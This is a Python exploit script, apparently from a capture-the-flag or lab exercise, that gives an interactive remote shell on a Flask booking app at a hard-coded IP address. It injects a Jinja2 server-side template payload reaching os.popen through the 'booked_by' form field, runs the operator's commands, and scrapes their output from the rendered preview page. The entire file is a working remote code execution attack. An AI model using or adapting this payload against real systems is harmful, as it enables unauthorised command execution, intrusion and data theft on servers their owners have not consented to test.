import requests
from bs4 import BeautifulSoup

url     = "http://135.235.193.119:5000/book/1"
session = requests.Session()

while True:
    cmd = input("$ ")
    if cmd.strip().lower() in ("exit", "quit"):
        break
    payload = "{{ cycler.__init__.__globals__.os.popen(" + repr(cmd) + ").read() }}"

    resp = session.post(
        url,
        data={
            "booked_by": payload,
            "date":      "2025-07-03",
            "start":     "09:00",
            "end":       "09:01",
            "action":    "preview",
        }
    )
    resp.raise_for_status()

    soup = BeautifulSoup(resp.text, "html.parser")

    booking_p = None
    for p in soup.find_all("p"):
        strong = p.find("strong")
        if strong and strong.get_text(strip=True) == "Booked by:":
            booking_p = p
            break

    if booking_p:
        booking_p.strong.extract()
        output = "\n".join(line.strip()
                            for line in booking_p.get_text().splitlines()
                            if line.strip())
    else:
        output = "No output found."

    print(output)


